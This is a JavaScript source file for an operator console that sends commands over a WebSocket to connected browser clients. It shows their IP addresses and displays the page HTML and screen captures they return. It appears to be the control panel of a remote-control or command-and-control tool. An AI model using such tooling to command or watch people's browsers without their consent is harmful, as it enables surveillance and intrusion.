//WINDOWS: {"url":"https://www.pointercrate.com/demonlist/","focused":true,"height":500,"width":500,"left":100,"top":100,"state":"normal","type":"normal"}

'use strict'
let ws = new WebSocket("ws://" + (location.host||"10.0.0.67:3000")),
    clients = [],
    messageFilter = ["activeUsers"]

function send(obj) {
    ws.send(JSON.stringify(obj))
}

ws.onopen = () => {
    send({ type: "auth", value: "console" })

    ws.onmessage = message => {
        let m = JSON.parse(message.data)
        if (!messageFilter.includes(m.type)) console.log(m)//
        if (m.type == "initAuth") {// AUTH
            responseTargetInput.value = ws.id = m.value
        } else if (m.type == "activeUsers") {// UPDATE ACTIVE USERS
            activeUsers.value = ""
            clients = m.value
            clients.forEach(c => {
                activeUsers.value += `${c.id} : (${c.ip}) - ${c.auth}\n`
            })
        } else if (m.type == "response") { // MANAGE RESPONSE FROM USERS
            if (m.isHTML) {
                let htmlRes = document.createElement("html")
                htmlRes.innerHTML = m.value
                console.log(htmlRes)
                consoleTxt.value = "See console for HTML element" + "\n" + consoleTxt.value
            } else if (m.isImg && m.value && m.value != "undefined") {
                consoleTxt.value = "The capture of ["+m.clientId+"] is now visible" + "\n" + consoleTxt.value
                captureDisplay.src = m.value
                imageViewer.style.display = "block"
            }
            else consoleTxt.value = m.value + "\n" + consoleTxt.value
            
        }
    }
} 

imageViewer.onclick = () => {
    imageViewer.style.display = "none"
}

// COMMANDS
function sendCommand(e, v, command, targets=[], rt=[]) {
    ch_i = vh_i = -1
    if (e.ctrlKey) {
        valueInput.value = ""
        commandInput.value = ""
    }

    if (!commandHistory.includes(command)) commandHistory.unshift(command)
    if (!valueHistory.includes(v)) valueHistory.unshift(v)

    if (command == "cls") consoleTxt.value = ""
    else send({ type: "command", command: command, value: v, targets: targets?.length ? targets : clients.filter(c=>c.auth=="client").map(c => c.id), responseTarget: rt?.length ? rt : ws.id })
}

let commandHistory = [], ch_i = -1
commandInput.onkeydown = e => {
    let k = e.key.toLowerCase(), ch_ll = commandHistory.length, c = commandInput.value.trim()
    if (k == "enter" && c !== "") {
        sendCommand(e, valueInput.value.trim(), c, targetInput.value.match(/[0-9]+/g), responseTargetInput.value.match(/[0-9]+/))
    } else if (k == "arrowup" && ch_i < ch_ll - 1) {
        commandInput.value = commandHistory[++ch_i]
    } else if (k == "arrowdown" && ch_i >= 0) {
        commandInput.value = commandHistory[--ch_i] ?? ""
    }
}

let valueHistory = [], vh_i = -1
valueInput.onkeydown = e => {
    let k = e.key.toLowerCase(), vh_ll = valueHistory.length, c = commandInput.value.trim()
    if (k == "enter" && c !== "" && !e.shiftKey) {
        e.preventDefault()
        sendCommand(e, valueInput.value.trim(), c, targetInput.value.match(/[0-9]+/g), responseTargetInput.value.match(/[0-9]+/))
    } else if (k == "arrowup" && vh_i < vh_ll - 1 && (e.ctrlKey || e.altKey)) {
        e.preventDefault()
        valueInput.value = valueHistory[++vh_i]
    } else if (k == "arrowdown" && vh_i >= 0 && (e.ctrlKey || e.altKey)) {
        e.preventDefault()
        valueInput.value = valueHistory[--vh_i] ?? ""
    }
}

sendCommandBtn.onclick = e => {
    let c = commandInput.value.trim()
    if (c !== "") sendCommand(e, valueInput.value.trim(), c, targetInput.value.match(/[0-9]+/g), responseTargetInput.value.match(/[0-9]+/))
}

function toJSON(str) {
    return str ? JSON.parse(str.replaceAll("\n","").replaceAll(/(?<=\{|,)\s*(['"])?[a-z0-9_$]+\1?\s*['"]?(?=:)/gi, x=>'"'+x.match(/[a-z0-9]+/gi)+'"')) : ""
}

function setValueInput(v) {
    let dv = 0
    try { valueInput.value = dv = toJSON(v) ? JSON.stringify(toJSON(v), null, 3) : "" }
    catch { valueInput.value = v }

    valueInput.style.height = valueInput.style.width = commandInput.style.height = commandInput.style.width = "auto"
    valueInput.style.height = valueInput.scrollHeight < 250 ? valueInput.scrollHeight - 4 + "px" : "250px"
    valueInput.style.width = valueInput.scrollWidth < 600 ? valueInput.scrollWidth + (dv && 200) + "px" : "250px"
    commandInput.style.height = valueInput.style.height
}

function setCommandInput(v) {
    commandInput.value = v

    commandInput.style.height = commandInput.style.width = "auto"
    commandInput.style.width = commandInput.scrollWidth < 600 ? commandInput.scrollWidth + "px" : "250px"
    commandInput.style.height = valueInput.style.height
}

document.querySelectorAll(".cmd_name, .valueTemplates > span, .sub_cmd").forEach(el => {
    el.onclick = () => {
        setCommandInput(el.getAttribute("c") ?? "")
        setValueInput(el.getAttribute("v") ?? "")
    }
})

clearInputs.onclick = e => {
    if (e.ctrlKey) {
        targetInput.value = responseTargetInput.value = ""
    }
    commandInput.value = valueInput.value = ""
}

cmd_search.oninput=()=>{
    let s = cmd_search.value.toLowerCase()
    document.querySelectorAll(".cmd_list .cmd_name").forEach(el=>el.parentElement.parentElement.style.display=[el.textContent.toLowerCase(), el.getAttribute("c")?.toLowerCase()].some(x=>x.includes(s))?"":"none")
}

clear_search.onclick=cmd_search.oncontextmenu=(e)=>{
    e.preventDefault()
    cmd_search.value = ""
    document.querySelectorAll(".cmd_list .cmd").forEach(el=>el.style.display="")
}

